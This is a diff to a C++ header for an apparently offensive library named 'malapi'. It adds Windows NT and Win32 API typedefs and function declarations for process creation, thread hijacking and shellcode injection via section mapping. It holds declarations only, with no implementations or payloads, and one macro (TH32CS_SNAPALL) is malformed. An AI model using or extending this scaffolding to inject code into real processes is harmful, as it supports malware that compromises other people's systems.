@@ -1182,20 +1182,71 @@ typedef struct _PROCESS_LOGGING_INFORMATION
 	ULONG Reserved = 26;
 } PROCESS_LOGGING_INFORMATION, * PPROCESS_LOGGING_INFORMATION;
 
+typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;
+
+typedef struct _IO_STATUS_BLOCK
+{
+	union
+	{
+		NTSTATUS Status;
+		PVOID Pointer;
+	};
+	ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+
+typedef struct tagTHREADENTRY32 {
+	DWORD dwSize;
+	DWORD cntUsage;
+	DWORD th32ThreadID;
+	DWORD th32OwnerProcessID;
+	LONG  tpBasePri;
+	LONG  tpDeltaPri;
+	DWORD dwFlags;
+} THREADENTRY32;
+// https://networkdls.com/Win32Ref/THREADENTRY32.html
+typedef THREADENTRY32* PTHREADENTRY32;
+typedef THREADENTRY32* LPTHREADENTRY32;
+
+#pragma endregion
+
+#pragma region [ntapi_typedefs]
 typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(
 	_In_ PVOID ThreadParameter
 	);
 
-typedef DWORD(WINAPI* typeGetFileAttributesA)(
-	_In_ LPCSTR lpFileName
+typedef PVOID(NTAPI* typeRtlAllocateHeap)(
+	_In_     PVOID  HeapHandle,
+	_In_opt_ ULONG  Flags,
+	_In_     SIZE_T Size
 	);
 
-typedef BOOL(WINAPI* typeGetTokenInformation)(
-	_In_            HANDLE                  TokenHandle,
-	_In_            TOKEN_INFORMATION_CLASS TokenInformationClass,
-	_Out_opt_       LPVOID                  TokenInformation,
-	_In_            DWORD                   TokenInformationLength,
-	_Out_           PDWORD                  ReturnLength
+typedef NTSTATUS(NTAPI* typeRtlCreateUserThread)(
+	_In_      HANDLE                     ProcessHandle,
+	_In_opt_  PSECURITY_DESCRIPTOR       ThreadSecurityDescriptor,
+	_In_      BOOLEAN                    CreateSuspended,
+	_In_opt_  ULONG                      ZeroBits,
+	_In_opt_  SIZE_T                     MaximumStackSize,
+	_In_opt_  SIZE_T                     CommittedStackSize,
+	_In_      PUSER_THREAD_START_ROUTINE StartAddress,
+	_In_opt_  PVOID                      Parameter,
+	_Out_opt_ PHANDLE                    ThreadHandle,
+	_Out_opt_ PCLIENT_ID                 ClientId
+	);
+
+typedef SIZE_T(NTAPI* typeRtlFreeHeap)(
+	_In_            PVOID HeapHandle,
+	_In_opt_        ULONG Flags,
+	_Frees_ptr_opt_ PVOID BaseAddress
 	);
 
 typedef NTSTATUS(NTAPI* typeNtCreateSection)(
@@ -1242,40 +1293,94 @@ typedef NTSTATUS(NTAPI* typeNtSetInformationThread)(
 	_In_                                      ULONG           ThreadInformationLength
 	);
 
+typedef NTSTATUS(NTAPI* typeNtQueryInformationProcess)(
+	_In_                                         HANDLE ProcessHandle,
+	_In_                                         PROCESSINFOCLASS ProcessInformationClass,
+	_Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
+	_In_                                         ULONG ProcessInformationLength,
+	_Out_opt_                                    PULONG ReturnLength
+	);
+
+typedef NTSTATUS(NTAPI* typeNtCreateProcess)(
+	_Out_ PHANDLE ProcessHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ HANDLE ParentProcess,
+	_In_ BOOLEAN InheritObjectTable,
+	_In_opt_ HANDLE SectionHandle,
+	_In_opt_ HANDLE DebugPort,
+	_In_opt_ HANDLE TokenHandle
+	);
+
+typedef NTSTATUS(NTAPI* typeNtCreateProcessEx)(
+	_Out_ PHANDLE ProcessHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ HANDLE ParentProcess,
+	_In_ ULONG Flags, // PROCESS_CREATE_FLAGS_*
+	_In_opt_ HANDLE SectionHandle,
+	_In_opt_ HANDLE DebugPort,
+	_In_opt_ HANDLE TokenHandle,
+	_Reserved_ ULONG Reserved // JobMemberLevel
+	);
+
+typedef NTSTATUS(NTAPI* typeNtTerminateProcess)(
+	_In_opt_ HANDLE ProcessHandle,
+	_In_ NTSTATUS ExitStatus
+	);
+
+typedef NTSTATUS(NTAPI* typeNtClose)(
+	_In_ _Post_ptr_invalid_ HANDLE Handle
+	);
+
+typedef NTSTATUS(NTAPI* typeNtCreateFile)(
+	_Out_ PHANDLE FileHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
+	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
+	_In_opt_ PLARGE_INTEGER AllocationSize,
+	_In_ ULONG FileAttributes,
+	_In_ ULONG ShareAccess,
+	_In_ ULONG CreateDisposition,
+	_In_ ULONG CreateOptions,
+	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
+	_In_ ULONG EaLength
+	);
+
+typedef NTSTATUS(NTAPI* typeNtOpenFile)(
+	_Out_ PHANDLE FileHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
+	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
+	_In_ ULONG ShareAccess,
+	_In_ ULONG OpenOptions
+	);
+
+typedef NTSTATUS(NTAPI* typeNtDeleteFile)(
+	_In_ POBJECT_ATTRIBUTES ObjectAttributes
+	);
+
+#pragma endregion
+
+#pragma region [winapi_typedefs]
+
 typedef BOOL(WINAPI* typeOpenProcessToken)(
 	_In_  HANDLE  ProcessHandle,
 	_In_  DWORD   DesiredAccess,
 	_Out_ PHANDLE TokenHandle
 	);
 
-typedef PVOID(NTAPI* typeRtlAllocateHeap)(
-	_In_     PVOID  HeapHandle,
-	_In_opt_ ULONG  Flags,
-	_In_     SIZE_T Size
+typedef DWORD(WINAPI* typeGetFileAttributesA)(
+	_In_ LPCSTR lpFileName
 	);
 
-typedef NTSTATUS(NTAPI* typeRtlCreateUserThread)(
-	_In_      HANDLE                     ProcessHandle,
-	_In_opt_  PSECURITY_DESCRIPTOR       ThreadSecurityDescriptor,
-	_In_      BOOLEAN                    CreateSuspended,
-	_In_opt_  ULONG                      ZeroBits,
-	_In_opt_  SIZE_T                     MaximumStackSize,
-	_In_opt_  SIZE_T                     CommittedStackSize,
-	_In_      PUSER_THREAD_START_ROUTINE StartAddress,
-	_In_opt_  PVOID                      Parameter,
-	_Out_opt_ PHANDLE                    ThreadHandle,
-	_Out_opt_ PCLIENT_ID                 ClientId
+typedef BOOL(WINAPI* typeGetTokenInformation)(
+	_In_            HANDLE                  TokenHandle,
+	_In_            TOKEN_INFORMATION_CLASS TokenInformationClass,
+	_Out_opt_       LPVOID                  TokenInformation,
+	_In_            DWORD                   TokenInformationLength,
+	_Out_           PDWORD                  ReturnLength
 	);
-
-typedef SIZE_T(NTAPI* typeRtlFreeHeap)(
-	_In_            PVOID HeapHandle,
-	_In_opt_        ULONG Flags,
-	_Frees_ptr_opt_ PVOID BaseAddress
-	);
-
-#pragma endregion
-
-#pragma region [kernel32_typedefs]
 
 typedef BOOL(WINAPI* typeWriteProcessMemory)(
 	_In_  HANDLE  hProcess,
@@ -1283,6 +1388,12 @@ typedef BOOL(WINAPI* typeWriteProcessMemory)(
 	_In_  LPCVOID lpBuffer,
 	_In_  SIZE_T  nSize,
 	_Out_ SIZE_T* lpNumberOfBytesWritten
+	);
+
+typedef LPVOID(WINAPI* typeHeapAlloc)(
+	_In_ HANDLE hHeap,
+	_In_ DWORD dwFlags,
+	_In_ SIZE_T dwBytes
 	);
 
 typedef BOOL(WINAPI* typeHeapFree)(
@@ -1293,6 +1404,16 @@ typedef BOOL(WINAPI* typeHeapFree)(
 
 typedef BOOL(WINAPI* typeCloseHandle)(
 	_In_ HANDLE hObject
+	);
+
+typedef HANDLE(WINAPI* typeCreateFileA)(
+	_In_		LPCSTR lpFileName,
+	_In_		DWORD dwDesiredAccess,
+	_In_		DWORD dwShareMode,
+	_In_opt_	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+	_In_		DWORD dwCreationDisposition,
+	_In_		DWORD dwFlagsAndAttributes,
+	_In_opt_	HANDLE hTemplateFile
 	);
 
 typedef DWORD(WINAPI* typeGetProcessId)(
@@ -1370,15 +1491,82 @@ typedef BOOL(WINAPI* typeVirtualFreeEx)(
 	_In_ DWORD dwFreeType
 	);
 
-typedef LPVOID(WINAPI* typeHeapAlloc)(
-	_In_ HANDLE hHeap,
-	_In_ DWORD dwFlags,
-	_In_ SIZE_T dwBytes
-	);
-
 typedef DWORD(WINAPI* typeWaitForSingleObject)(
 	_In_ HANDLE hHandle,
 	_In_ DWORD  dwMilliseconds
+	);
+
+typedef BOOL(WINAPI* typeCreateProcessA)(
+	_In_opt_	LPCSTR lpApplicationName,
+	_Inout_opt_ LPSTR lpCommandLine,
+	_In_opt_	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	_In_opt_	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	_In_		BOOL bInheritHandles,
+	_In_		DWORD dwCreationFlags,
+	_In_opt_	LPVOID lpEnvironment,
+	_In_opt_	LPCSTR lpCurrentDirectory,
+	_In_		LPSTARTUPINFOA lpStartupInfo,
+	_Out_		LPPROCESS_INFORMATION lpProcessInformation
+	);
+
+typedef BOOL(WINAPI* typeCreateProcessW)(
+	_In_opt_	LPCWSTR lpApplicationName,
+	_Inout_opt_ LPWSTR lpCommandLine,
+	_In_opt_	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	_In_opt_	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	_In_		BOOL bInheritHandles,
+	_In_		DWORD dwCreationFlags,
+	_In_opt_	LPVOID lpEnvironment,
+	_In_opt_	LPCWSTR lpCurrentDirectory,
+	_In_		LPSTARTUPINFOW lpStartupInfo,
+	_Out_		LPPROCESS_INFORMATION lpProcessInformation
+	);
+
+#define TH32CS_INHERIT		0x80000000
+#define TH32CS_SNAPHEAPLIST 0x00000001
+#define TH32CS_SNAPMODULE	0x00000008
+#define TH32CS_SNAPMODULE32 0x00000010
+#define TH32CS_SNAPPROCESS	0x00000002
+#define TH32CS_SNAPTHREAD	0x00000004
+#define TH32CS_SNAPALL TH32CS_INHERIT TH32CS_SNAPHEAPLIST TH32CS_SNAPMODULE TH32CS_SNAPMODULE32 TH32CS_SNAPPROCESS TH32CS_SNAPTHREAD
+
+typedef HANDLE(WINAPI* typeCreateToolhelp32Snapshot)(
+	_In_ DWORD dwFlags,
+	_In_ DWORD th32ProcessID
+	);
+
+typedef BOOL(WINAPI* typeThread32First)(
+	_In_		HANDLE hSnapshot,
+	_Inout_		LPTHREADENTRY32 lpte
+	);
+
+typedef BOOL(WINAPI* typeThread32Next)(
+	_In_		HANDLE hSnapshot,
+	_Out_		LPTHREADENTRY32 lpte
+	);
+
+typedef HANDLE(WINAPI* typeOpenThread)(
+	_In_ DWORD	dwDesiredAccess,
+	_In_ BOOL	bInheritHandle,
+	_In_ DWORD	dwThreadId
+	);
+
+typedef BOOL(WINAPI* typeGetThreadContext)(
+	_In_	HANDLE hThread,
+	_Inout_	LPCONTEXT lpContext
+	);
+
+typedef BOOL(WINAPI* typeSetThreadContext)(
+	_In_	HANDLE hThread,
+	_Inout_	const CONTEXT* lpContext
+	);
+
+typedef DWORD(WINAPI* typeResumeThread)(
+	_In_ HANDLE hThread
+	);
+
+typedef DWORD(WINAPI* typeSuspendThread)(
+	_In_ HANDLE hThread
 	);
 
 #pragma endregion
@@ -1489,6 +1677,11 @@ namespace malapi
 	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount);
 
 	//
+	// Close a given handle via K32!CloseHandle.
+	//
+	VOID CloseHandle(_In_ HANDLE Handle);
+
+	//
 	// Uses OpenProcess to get a handle to the process
 	// Returns NULL on failure.
 	//
@@ -1504,6 +1697,17 @@ namespace malapi
 	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
 	//
 	BOOL CheckFileExists(_In_ LPCSTR FullPath);
+
+	//
+	// Wrapper around K32!CreateProcessW.
+	//
+	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory = NULL);
+
+	//
+	// Create Suspended Process
+	// RETURN ProcessHandle
+	//
+	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path);
 
 	//
 	// GetModuleHandle implementation with API hashing.
@@ -1558,6 +1762,11 @@ namespace malapi
 	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength);
 
 	//
+	// Gets the process cookie from the PEB
+	//
+	ULONG GetProcessCookie(void);
+
+	//
 	// Allocate a block of memory in the current process' heap.
 	// Returns a pointer to the allocated chunk, or NULL on failure.
 	//
@@ -1578,7 +1787,7 @@ namespace malapi
 	//
 	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
 	//
-	VOID InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength);
+	BOOL InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength);
 
 	//
 	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
@@ -1626,11 +1835,6 @@ namespace malapi
 	// String copy implementation (wchar).
 	//
 	PWCHAR StringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2);
-
-	//
-	// XORs input with a given key, will repeat the key if KeyLen < InputLen.
-	//
-	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
 	//
 	// Zero a region of memory.
